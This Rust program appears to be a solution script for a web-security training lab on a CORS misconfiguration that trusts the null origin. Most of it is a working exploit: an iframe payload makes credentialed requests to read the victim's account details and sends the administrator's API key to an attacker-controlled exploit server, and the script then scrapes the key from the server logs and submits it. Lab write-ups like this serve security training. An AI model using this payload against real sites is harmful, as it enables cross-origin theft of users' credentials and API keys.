/******************************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 20/10/2023
*
* Lab: CORS vulnerability with trusted null origin
*
* Steps: 1. Deliver the exploit to the victim
*        2. Fetch your exploit server log page
*        3. Extract the administrator's API key from the logs
*        4. Submit the solution
*
*******************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let lab_url = "https://0aad00c704292b0e84c219ff000d008e.web-security-academy.net";

    // change this to your exploit server URL
    let exploit_server_url = "https://exploit-0a2400c304dd2be38497187b01b00049.exploit-server.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // the header of your exploit sever response
    let exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";

    // payload that uses CORS to retrieve the administrator's API key
    // this payload uses the fetch API instead of XMLHttpRequest API
    let payload = format!(
        r###"<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
                fetch('{lab_url}/accountDetails', {{
                method: 'GET',
                credentials: 'include'
                }})
                .then(response => response.text())
                .then(data => {{
                    fetch('{exploit_server_url}/log?key=' + data);
                }});
                </script>"></iframe>"###
    );

    print!("{}", "â¦—1â¦˜ Delivering the exploit to the victim.. ".white(),);
    io::stdout().flush();

    // deliver the exploit to the victim
    client
        .post(exploit_server_url)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", exploit_server_head),
            ("responseBody", &payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to deliver the exploit to the victim".red()
        ));

    println!("{}", "OK".green());
    print!("{}", "â¦—2â¦˜ Fetching your exploit server log page.. ".white(),);
    io::stdout().flush();

    // fetch the log page
    let logs = client
        .get(format!("{exploit_server_url}/log"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the logs".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "â¦—3â¦˜ Extracting the administrator's API key from the logs.. ".white(),
    );
    io::stdout().flush();

    // get the body of the response
    let body = logs.text().unwrap();

    // extract the API key
    let api_key = capture_pattern("apikey%22:%20%22(.*)%22,", &body)
        .expect(&format!("{}", "[!] Failed to extract the API key".red()));

    println!("{} => {}", "OK".green(), api_key.yellow());
    print!("{}", "â¦—4â¦˜ Submitting the solution.. ".white());
    io::stdout().flush();

    // submit the solution
    client
        .post(format!("{lab_url}/submitSolution"))
        .form(&HashMap::from([("answer", api_key)]))
        .send()
        .expect(&format!("{}", "[!] Failed to submit the solution".red()));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "ðŸ—¹ Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}
